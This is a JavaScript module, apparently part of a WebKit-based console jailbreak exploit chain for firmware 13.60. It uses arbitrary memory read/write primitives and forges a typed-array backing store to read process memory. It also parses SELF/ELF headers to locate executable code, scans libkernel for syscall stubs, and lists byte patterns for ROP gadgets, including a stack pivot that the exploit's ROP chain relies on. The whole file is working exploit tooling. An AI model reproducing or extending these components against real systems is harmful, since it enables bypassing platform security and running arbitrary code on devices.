// dynscan.js -- dynamic gadget / syscall-stub resolution for firmware profiles
// whose offsets/XX.XX.js carries placeholder (copied) offsets, e.g. 13.60.
//
// NOT wired into the exploit flow yet. Loadable via a plain
//   <script src="dynscan.js"></script>
// (no modules, no import/export -- everything is assigned to globalThis,
// matching the repo's plain-script style of main.js / rop.js / offsets).
//
// Exports (globals):
//   DYN_WK_GADGET_SPECS                      -- byte-pattern specs for wk_gadgetmap
//   dynFindTextRange(moduleBase)  -> Promise<{base:int64, size:number, vaddr, offset, elfAddr:int64}>
//   dynScanSyscalls(textBase, textSize)      -> Promise<{syscallNumber -> int64 absolute stub address}>
//   dynFindGadgets(textBase, textSize, gadgetSpecs) -> Promise<{name -> int64 absolute gadget address}>
//
// How prepare() in main.js would later call into this (fw 13.60 path):
//   after the MODULE-BASES jbmark (main.js:147-149), replacing the static
//   add32 loops at main.js:154-159:
//     const lkText = await dynFindTextRange(libKernelBase);
//     syscalls = await dynScanSyscalls(lkText.base, lkText.size);
//     const wkText = await dynFindTextRange(libSceNKWebKitBase);
//     gadgets  = await dynFindGadgets(wkText.base, wkText.size, DYN_WK_GADGET_SPECS);
//   The returned maps are drop-in compatible: gadgets uses the same name
//   strings as wk_gadgetmap, syscalls uses the same numeric keys as
//   syscall_map (rop.js indexes this.syscalls[SYS_*] with decimal numbers).
//
// Progress / crash trail: both scanners log through window.jb.mark (same hook
// as main.js's jbmark) with tags DYNSCAN-ELF / DYNSCAN-CHUNK / DYNSCAN-HIT /
// DYNSCAN-DONE / DYNSCAN-WARN / DYNSCAN-FAIL, and yield to the event loop
// every DYNSCAN_YIELD_CHUNKS chunks so the page stays alive and logs flush.
// NOTE: poops.html's captureRemoteEvent whitelist (poops.html:800) does not
// currently forward DYNSCAN-* tags to the remote log; that regex needs
// "DYNSCAN-" added when this file is wired in.
//
// Primitive usage: only window.p (installed by mem.js installWindowP) --
// p.read1/read2/read4/read8/leakval, and p.write8/write4 for the optional
// fast bulk reader. mem.js exposes no bulk read on window.p (readInto is a
// module-internal export), so the default reader is a chunked p.read8 loop.
// A fast path is attempted first: re-aim a Uint8Array's backing store at the
// target exactly like main.js's array_from_address (leakval+0x10 = m_vector,
// +0x8 = m_length, +0xC = m_mode), verified byte-for-byte against p.read8
// before being trusted; if verification fails the chunked read8 loop is used.

(function () {

    const DYNSCAN_CHUNK = 0x10000;        // 64KB read chunks
    const DYNSCAN_OVERLAP = 0x10;         // bytes carried across chunk edges
    const DYNSCAN_YIELD_CHUNKS = 8;       // await a 0ms timer every 8 chunks (512KB)
    const DYNSCAN_LOG_CHUNKS = 32;        // jbmark DYNSCAN-CHUNK every 32 chunks (2MB)
    const SELF_MAGIC = 0x1d3d154f;
    const ELF_MAGIC = 0x464c457f;         // "\x7fELF" little-endian
    const SELF_ELF_SEARCH_MAX = 0x40000;  // ELF header must be within this of base
    const PT_LOAD = 1;
    const PF_X = 1;

    // Pinned so GC never collects the re-aimed array (same trick as main.js's nogc).
    const dynRetain = [];

    function dynmark(tag, detail) {
        try {
            if (window.jb && typeof window.jb.mark === "function")
                window.jb.mark(tag, String(detail));
        } catch (e) { }
    }

    function needP() {
        const p = globalThis.p;
        if (!p || typeof p.read8 !== "function" || typeof p.read4 !== "function")
            throw new Error("dynscan: window.p read primitive is not installed");
        return p;
    }

    function yield0() {
        return new Promise(function (resolve) { setTimeout(resolve, 0); });
    }

    function i64num(a) {
        if (typeof a === "number") {
            if (!Number.isFinite(a) || Math.floor(a) !== a || a < 0)
                throw new TypeError("dynscan: bad numeric address " + a);
            return a;
        }
        if (a && typeof a.low === "number")
            return (a.hi >>> 0) * 0x100000000 + (a.low >>> 0);
        throw new TypeError("dynscan: bad address (expected int64 or number)");
    }

    function numI64(n) {
        const hi = Math.floor(n / 0x100000000);
        return new int64(n - hi * 0x100000000, hi); // int64 global from int64.js
    }

    // ---------------------------------------------------------------------
    // Bulk readers
    // ---------------------------------------------------------------------

    // Slow-but-sure reader: chunked p.read8 into dst (Uint8Array view).
    function makeSlowReader(p) {
        return {
            kind: "read8-loop",
            read: function (dst, addrNum, len) {
                const words = len >>> 3;
                const d32 = new Uint32Array(dst.buffer, dst.byteOffset, words * 2);
                for (let i = 0; i < words; i++) {
                    const v = p.read8(addrNum + i * 8);
                    d32[i * 2] = v.low;
                    d32[i * 2 + 1] = v.hi;
                }
                for (let i = words * 8; i < len; i++)
                    dst[i] = p.read1(addrNum + i);
            }
        };
    }

    // Fast reader: forge a Uint8Array whose backing store points at target
    // memory (identical layout assumptions to main.js's array_from_address).
    // Returns null if the forged view does not read back what p.read8 sees.
    function makeFastReader(p, probeAddrNum) {
        try {
            const og = new Uint8Array(0x1000);
            dynRetain.push(og);
            const cell = p.leakval(og).add32(0x10);

            function setAddr(addrNum, len) {
                p.write8(cell, numI64(addrNum));
                p.write4(cell.add32(0x8), len >>> 0);
                p.write4(cell.add32(0xC), 0x1);
            }

            setAddr(probeAddrNum, 0x1000);
            if (og.length !== 0x1000)
                return null;
            // Verify 16 bytes against the real primitive before trusting it.
            const v0 = p.read8(probeAddrNum);
            const v1 = p.read8(probeAddrNum + 8);
            const expect = [
                v0.low & 0xff, (v0.low >>> 8) & 0xff, (v0.low >>> 16) & 0xff, (v0.low >>> 24) & 0xff,
                v0.hi & 0xff, (v0.hi >>> 8) & 0xff, (v0.hi >>> 16) & 0xff, (v0.hi >>> 24) & 0xff,
                v1.low & 0xff, (v1.low >>> 8) & 0xff, (v1.low >>> 16) & 0xff, (v1.low >>> 24) & 0xff,
                v1.hi & 0xff, (v1.hi >>> 8) & 0xff, (v1.hi >>> 16) & 0xff, (v1.hi >>> 24) & 0xff
            ];
            for (let i = 0; i < 16; i++)
                if (og[i] !== expect[i])
                    return null;

            return {
                kind: "forged-view",
                read: function (dst, addrNum, len) {
                    setAddr(addrNum, len);
                    if (og.length !== len)
                        throw new Error("dynscan: forged view lost its length");
                    dst.set(og); // native-speed copy out of the module
                }
            };
        } catch (e) {
            return null;
        }
    }

    function makeReader(p, probeAddrNum) {
        const fast = makeFastReader(p, probeAddrNum);
        if (fast !== null) {
            dynmark("DYNSCAN-READER", "kind=forged-view-probe=0x" + probeAddrNum.toString(16));
            return fast;
        }
        dynmark("DYNSCAN-READER", "kind=read8-loop-forged-view-rejected");
        return makeSlowReader(p);
    }

    // ---------------------------------------------------------------------
    // Generic chunked region scanner
    // ---------------------------------------------------------------------
    // onByte(buf, i, dataEnd, globalOff) is invoked per byte position;
    // it returns true if the scan should stop entirely (early exit).
    async function scanRegion(tag, p, reader, baseNum, size, onByte) {
        const buf = new Uint8Array(DYNSCAN_CHUNK + DYNSCAN_OVERLAP);
        const t0 = Date.now();
        let prefix = 0;     // overlap bytes at the front of buf
        let chunk = 0;
        for (let off = 0; off < size; off += DYNSCAN_CHUNK) {
            const len = Math.min(DYNSCAN_CHUNK, size - off);
            reader.read(buf.subarray(prefix, prefix + len), baseNum + off, len);
            const dataEnd = prefix + len;
            for (let i = prefix; i < dataEnd; i++) {
                if (onByte(buf, i, dataEnd, off + i - prefix))
                    return;
            }
            chunk++;
            if (chunk % DYNSCAN_LOG_CHUNKS === 0)
                dynmark("DYNSCAN-CHUNK", "mod=" + tag
                    + "-off=0x" + (off + len).toString(16)
                    + "-pct=" + Math.floor((off + len) * 100 / size)
                    + "-ms=" + (Date.now() - t0));
            if (chunk % DYNSCAN_YIELD_CHUNKS === 0)
                await yield0();
            // carry the tail into the next chunk so patterns spanning the
            // chunk boundary are not missed
            const keep = Math.min(DYNSCAN_OVERLAP, dataEnd);
            buf.copyWithin(0, dataEnd - keep, dataEnd);
            prefix = keep;
        }
    }

    // ---------------------------------------------------------------------
    // Syscall stub scan
    // ---------------------------------------------------------------------
    // libkernel-style syscall stubs look like:
    //   48 C7 C0 <imm32>    mov rax, imm32      ; syscall number
    //   4C 89 CA            mov r10, rcx        ; syscall ABI arg fixup
    //   0F 05               syscall
    // The stub address stored in syscall_map (e.g. OFFSET 0x1B7D0 for
    // SYS_GETPID=0x14, which equals OFFSET_lk_getpid) is the address of the
    // 48 C7 C0 byte. We extract imm32 -> syscall number and keep the FIRST
    // occurrence per number (duplicates are counted and logged).
    async function dynScanSyscalls(textBase, textSize) {
        const p = needP();
        const baseNum = i64num(textBase);
        const size = i64num(textSize);
        const t0 = Date.now();
        dynmark("DYNSCAN-START", "what=syscalls-base=0x" + baseNum.toString(16)
            + "-size=0x" + size.toString(16));
        const reader = makeReader(p, baseNum);

        const map = {};
        let hits = 0, dups = 0;
        await scanRegion("lk", p, reader, baseNum, size,
            function (b, i, dataEnd, goff) {
                if (b[i] !== 0x48 || i + 11 > dataEnd) return false;
                if (b[i + 1] !== 0xC7 || b[i + 2] !== 0xC0) return false;
                if (b[i + 7] !== 0x4C || b[i + 8] !== 0x89 || b[i + 9] !== 0xCA) return false;
                if (b[i + 10] !== 0x0F || b[i + 11] !== 0x05) return false;
                const num = (b[i + 3] | (b[i + 4] << 8) | (b[i + 5] << 16)
                    | (b[i + 6] << 24)) >>> 0;
                const addr = numI64(baseNum + goff);
                if (map[num] === undefined) {
                    map[num] = addr;
                    hits++;
                    dynmark("DYNSCAN-HIT", "sys=0x" + num.toString(16)
                        + "-addr=0x" + addr.toString());
                } else {
                    dups++;
                }
                return false;
            });

        if (hits === 0) {
            dynmark("DYNSCAN-FAIL", "what=syscalls-no-stubs-found-wrong-range?");
            throw new Error("dynscan: no syscall stubs found in the given .text "
                + "range -- wrong module base or wrong PT_LOAD (base=0x"
                + baseNum.toString(16) + " size=0x" + size.toString(16) + ")");
        }
        if (map[0x14] === undefined) // SYS_GETPID must exist in any libkernel
            dynmark("DYNSCAN-WARN", "SYS_GETPID(0x14)-stub-not-found-map-suspect");
        if (hits < 200)
            dynmark("DYNSCAN-WARN", "only-" + hits + "-stubs-expected-~330");
        dynmark("DYNSCAN-DONE", "what=syscalls-hits=" + hits + "-dups=" + dups
            + "-ms=" + (Date.now() - t0));
        return map;
    }

    // ---------------------------------------------------------------------
    // Gadget scan
    // ---------------------------------------------------------------------
    // gadgetSpecs: array of {name, bytes:[...], mask:[...]} -- mask[i]==1 means
    // byte i must match, mask[i]==0 is a wildcard. The FIRST occurrence of each
    // pattern in .text wins. Scans stop early once every spec has a hit.
    //
    // CAVEAT: short patterns (2-3 bytes) can match mid-instruction garbage
    // (e.g. 5F C3 inside an immediate). The gadget must then be validated by
    // execution on console; the mask field allows tightening a spec later.
    async function dynFindGadgets(textBase, textSize, gadgetSpecs) {
        const p = needP();
        const baseNum = i64num(textBase);
        const size = i64num(textSize);
        const t0 = Date.now();
        dynmark("DYNSCAN-START", "what=gadgets-base=0x" + baseNum.toString(16)
            + "-size=0x" + size.toString(16) + "-specs=" + gadgetSpecs.length);
        const reader = makeReader(p, baseNum);

        // first-byte dispatch table: byte value -> specs that may start there
        const table = [];
        let remaining = 0;
        for (const spec of gadgetSpecs) {
            if (!spec.mask) spec.mask = spec.bytes.map(function () { return 1; });
            if (spec.mask.length !== spec.bytes.length)
                throw new Error("dynscan: spec " + spec.name + " mask/bytes length mismatch");
            if (spec.mask[0]) {
                const fb = spec.bytes[0];
                (table[fb] || (table[fb] = [])).push(spec);
            } else {
                // wildcard first byte: attach to a catch-all list
                (table[256] || (table[256] = [])).push(spec);
            }
            spec._found = false;
            remaining++;
        }

        const out = {};
        await scanRegion("wk", p, reader, baseNum, size,
            function (b, i, dataEnd, goff) {
                const cands = table[b[i]];
                const wild = table[256];
                if (!cands && !wild) return false;
                for (let pass = 0; pass < 2; pass++) {
                    const list = pass === 0 ? cands : wild;
                    if (!list) continue;
                    for (let s = 0; s < list.length; s++) {
                        const spec = list[s];
                        if (spec._found) continue;
                        const L = spec.bytes.length;
                        if (i + L > dataEnd) continue;
                        let ok = true;
                        for (let j = 0; j < L; j++) {
                            if (spec.mask[j] && b[i + j] !== spec.bytes[j]) { ok = false; break; }
                        }
                        if (!ok) continue;
                        spec._found = true;
                        const addr = numI64(baseNum + goff);
                        out[spec.name] = addr;
                        remaining--;
                        dynmark("DYNSCAN-HIT", "gad=" + spec.name.replace(/ /g, "_")
                            + "-addr=0x" + addr.toString() + "-left=" + remaining);
                        if (remaining === 0) return true; // early exit
                    }
                }
                return false;
            });

        if (remaining !== 0) {
            const missing = gadgetSpecs.filter(function (s) { return !s._found; })
                .map(function (s) { return s.name; });
            dynmark("DYNSCAN-FAIL", "what=gadgets-missing=" + missing.join(","));
            throw new Error("dynscan: gadgets not found in .text: " + missing.join(", "));
        }
        dynmark("DYNSCAN-DONE", "what=gadgets-count=" + gadgetSpecs.length
            + "-ms=" + (Date.now() - t0));
        return out;
    }

    // ---------------------------------------------------------------------
    // .text bounds: parse the SELF/ELF headers at the module base
    // ---------------------------------------------------------------------

    // SELF header (psdevwiki): +0x00 u32 magic=0x1d3d154f, +0x18 u16 num_entries,
    // entries at +0x20, stride 0x20: +0x00 u64 props (bits 0-15 flags,
    // 0x800 = blocked/skipped by the loader; bits 48-63 = segment index),
    // +0x08 u64 file offset, +0x10 u64 file size, +0x18 u64 memory size.
    async function findElfInSelf(p, baseNum) {
        const numEntries = p.read2(baseNum + 0x18);
        dynmark("DYNSCAN-SELF", "entries=" + numEntries);
        const candidates = [];
        for (let i = 0; i < numEntries && i < 0x40; i++) {
            const ent = baseNum + 0x20 + i * 0x20;
            const props = p.read8(ent);
            const off = i64num(p.read8(ent + 0x8));
            const filesz = i64num(p.read8(ent + 0x10));
            if (props.low & 0x800) continue;         // blocked segment
            if (filesz < 0x40) continue;
            candidates.push(off);
        }
        candidates.sort(function (a, b) { return a - b; });
        for (const off of candidates) {
            if (off > SELF_ELF_SEARCH_MAX) continue;
            if ((p.read4(baseNum + off) >>> 0) === ELF_MAGIC)
                return baseNum + off;
        }
        // Fallback: linear search for the ELF magic near the module start.
        for (let off = 0x40; off < SELF_ELF_SEARCH_MAX; off += 4) {
            if ((p.read4(baseNum + off) >>> 0) === ELF_MAGIC)
                return baseNum + off;
            if ((off & 0x1FFF) === 0) await yield0();
        }
        throw new Error("dynscan: SELF at 0x" + baseNum.toString(16)
            + " but no embedded ELF header found within 0x"
            + SELF_ELF_SEARCH_MAX.toString(16));
    }

    // ELF64: +0x20 u64 e_phoff, +0x36 u16 e_phentsize, +0x38 u16 e_phnum.
    // Phdr: +0x00 u32 p_type, +0x04 u32 p_flags, +0x08 u64 p_offset,
    //       +0x10 u64 p_vaddr, +0x28 u64 p_memsz.
    // .text = executable PT_LOAD with the lowest vaddr. Module addresses in
    // this repo are base + rva where rva == p_vaddr (the offsets file header
    // notes file offset = rva + 0x4000, i.e. vaddr == file offset - 0x4000);
    // if a module has vaddr == 0 we fall back to p_offset.
    async function dynFindTextRange(moduleBase) {
        const p = needP();
        const baseNum = i64num(moduleBase);
        const magic = p.read4(baseNum) >>> 0;

        let elfNum = baseNum;
        if (magic === SELF_MAGIC) {
            elfNum = await findElfInSelf(p, baseNum);
        } else if (magic !== ELF_MAGIC) {
            dynmark("DYNSCAN-FAIL", "what=textrange-bad-magic=0x" + magic.toString(16)
                + "-base=0x" + baseNum.toString(16));
            throw new Error("dynscan: no SELF/ELF magic at module base 0x"
                + baseNum.toString(16) + " (read 0x" + magic.toString(16) + ")");
        }

        if (p.read1(elfNum + 4) !== 2)
            throw new Error("dynscan: ELF at 0x" + elfNum.toString(16) + " is not ELF64");

        const phoff = i64num(p.read8(elfNum + 0x20));
        const phentsize = p.read2(elfNum + 0x36);
        const phnum = p.read2(elfNum + 0x38);
        if (phnum === 0 || phnum > 0x40 || phentsize < 0x38)
            throw new Error("dynscan: implausible phdrs (num=" + phnum
                + " entsize=" + phentsize + ")");

        let best = null;
        for (let i = 0; i < phnum; i++) {
            const ph = elfNum + phoff + i * phentsize;
            if ((p.read4(ph) >>> 0) !== PT_LOAD) continue;
            if (!((p.read4(ph + 0x4) >>> 0) & PF_X)) continue;
            const poffset = i64num(p.read8(ph + 0x08));
            const pvaddr = i64num(p.read8(ph + 0x10));
            const pmemsz = i64num(p.read8(ph + 0x28));
            if (pmemsz === 0) continue;
            if (best === null || pvaddr < best.vaddr)
                best = { vaddr: pvaddr, offset: poffset, memsz: pmemsz };
        }
        if (best === null) {
            dynmark("DYNSCAN-FAIL", "what=textrange-no-exec-ptload-elf=0x" + elfNum.toString(16));
            throw new Error("dynscan: no executable PT_LOAD in ELF at 0x" + elfNum.toString(16));
        }

        const rva = best.vaddr !== 0 ? best.vaddr : best.offset;
        const textNum = baseNum + rva;
        dynmark("DYNSCAN-ELF", "mod=0x" + baseNum.toString(16)
            + "-elf=0x" + elfNum.toString(16)
            + "-text=0x" + textNum.toString(16)
            + "-size=0x" + best.memsz.toString(16)
            + "-vaddr=0x" + best.vaddr.toString(16)
            + "-off=0x" + best.offset.toString(16));
        return {
            base: numI64(textNum),
            size: best.memsz,
            vaddr: best.vaddr,
            offset: best.offset,
            elfAddr: numI64(elfNum)
        };
    }

    // ---------------------------------------------------------------------
    // Gadget byte-pattern specs, derived from rop.js usage of wk_gadgetmap.
    // mask defaults to all-exact (1s); wildcards (0) are supported but none
    // are needed for these encodings. Where an instruction has several valid
    // encodings the simplest canonical one was chosen (documented per entry).
    // ---------------------------------------------------------------------
    function spec(name, bytes) {
        return { name: name, bytes: bytes, mask: bytes.map(function () { return 1; }) };
    }

    const DYN_WK_GADGET_SPECS = [
        // "ret" -- stack-alignment sled in fcall()/self_healing_syscall*
        //   (rop.js:158,179-181,306-308). Any near-ret byte works: C3.
        spec("ret", [0xC3]),
        // "pop rdi" -- loads SysV arg0 / write destination (rop.js:74,82,94,...).
        //   pop r64 = 01011rrr; rdi is rrr=111 -> 5F, then C3.
        spec("pop rdi", [0x5F, 0xC3]),
        // "pop rsi" -- SysV arg1, 64-bit store source (rop.js:84,129). 5E C3.
        spec("pop rsi", [0x5E, 0xC3]),
        // "pop rdx" -- SysV arg2 (rop.js:134). 5A C3.
        spec("pop rdx", [0x5A, 0xC3]),
        // "pop rcx" -- SysV arg3 + addend source in push_add/create_branch
        //   (rop.js:139,327,359). 59 C3.
        spec("pop rcx", [0x59, 0xC3]),
        // "pop rax" -- deref source / value loader (rop.js:76,90,100,...). 58 C3.
        spec("pop rax", [0x58, 0xC3]),
        // "pop rsp" -- the pivot: written over the worker's saved return
        //   address (main.js:302), also branch landing (rop.js:172,392). 5C C3.
        spec("pop rsp", [0x5C, 0xC3]),
        // "pop r8" -- SysV arg4 (rop.js:144). REX.B (41) extends pop 58+r: 41 58 C3.
        spec("pop r8", [0x41, 0x58, 0xC3]),
        // "pop r9" -- SysV arg5 (rop.js:149). 41 59 C3.
        spec("pop r9", [0x41, 0x59, 0xC3]),
        // "mov [rdi], rsi" -- push_write8's 64-bit store (rop.js:86,96,106).
        //   48=REX.W, 89 /r = mov r/m64,r64, ModRM 00'110'111 = [rdi],rsi.
        spec("mov [rdi], rsi", [0x48, 0x89, 0x37, 0xC3]),
        // "mov [rdi], rax" -- write_result / push_set_reg_from_rax store
        //   (rop.js:112,199,330). ModRM 00'000'111 = [rdi],rax: 48 89 07 C3.
        spec("mov [rdi], rax", [0x48, 0x89, 0x07, 0xC3]),
        // "mov [rdi], eax" -- 32-bit store for push_write4/write_result4
        //   (rop.js:78,118). Same encoding without REX.W: 89 07 C3.
        spec("mov [rdi], eax", [0x89, 0x07, 0xC3]),
        // "mov rax, [rax]" -- 64-bit pointer deref (rop.js:92,102,237,...).
        //   8B /r = mov r64,r/m64, ModRM 00'000'000 = rax,[rax]: 48 8B 00 C3.
        spec("mov rax, [rax]", [0x48, 0x8B, 0x00, 0xC3]),
        // "add rax, rcx" -- arithmetic in push_inc8/push_add/create_branch
        //   (rop.js:329,345,387). 01 /r = add r/m64,r64, ModRM 11'001'000
        //   = rax,rcx: 48 01 C8 C3.
        spec("add rax, rcx", [0x48, 0x01, 0xC8, 0xC3]),
        // "cmp [rcx], eax" -- branch compare in create_branch (rop.js:366):
        //   sets flags from dword [rcx] vs eax for the setcc that follows.
        //   39 /r = cmp r/m32,r32, ModRM 00'000'001 = [rcx],eax: 39 01 C3.
        spec("cmp [rcx], eax", [0x39, 0x01, 0xC3]),
        // "inc dword [rax]" -- increment_dword (rop.js:456).
        //   FF /0 = inc r/m32, ModRM 00'000'000 = [rax]: FF 00 C3.
        spec("inc dword [rax]", [0xFF, 0x00, 0xC3]),
        // "seta al" -- ABOVE branch (rop.js:373). 0F 97 /0, ModRM 11'000'000 = al.
        spec("seta al", [0x0F, 0x97, 0xC0, 0xC3]),
        // "setb al" -- BELOW branch (rop.js:375). 0F 92 C0.
        spec("setb al", [0x0F, 0x92, 0xC0, 0xC3]),
        // "sete al" -- EQUAL branch (rop.js:371). 0F 94 C0.
        spec("sete al", [0x0F, 0x94, 0xC0, 0xC3]),
        // "setg al" -- GREATER branch (rop.js:377). 0F 9F C0.
        spec("setg al", [0x0F, 0x9F, 0xC0, 0xC3]),
        // "setl al" -- LESSER branch (rop.js:379). 0F 9C C0.
        spec("setl al", [0x0F, 0x9C, 0xC0, 0xC3]),
        // "shl rax, 3" -- branch table index x8 (rop.js:384), also
        //   multiply_by_0x4000. C1 /4 ib, ModRM 11'100'000: 48 C1 E0 03 C3.
        spec("shl rax, 3", [0x48, 0xC1, 0xE0, 0x03, 0xC3]),
        // "shl rax, 4" -- multiply_by_0x4000 (rop.js:406-407). 48 C1 E0 04 C3.
        spec("shl rax, 4", [0x48, 0xC1, 0xE0, 0x04, 0xC3]),
        // "shr rax, 3" -- multiply_by_0x4000 (rop.js:408-409).
        //   C1 /5 ib, ModRM 11'101'000: 48 C1 E8 03 C3.
        spec("shr rax, 3", [0x48, 0xC1, 0xE8, 0x03, 0xC3]),
        // "shr rax, 4" -- multiply_by_0x4000 counterpart. 48 C1 E8 04 C3.
        spec("shr rax, 4", [0x48, 0xC1, 0xE8, 0x04, 0xC3]),
        // "infloop" -- deliberate hang gadget from wk_gadgetmap. jmp $ = EB FE.
        spec("infloop", [0xEB, 0xFE])
    ];

    globalThis.DYN_WK_GADGET_SPECS = DYN_WK_GADGET_SPECS;
    globalThis.dynFindTextRange = dynFindTextRange;
    globalThis.dynScanSyscalls = dynScanSyscalls;
    globalThis.dynFindGadgets = dynFindGadgets;

})();
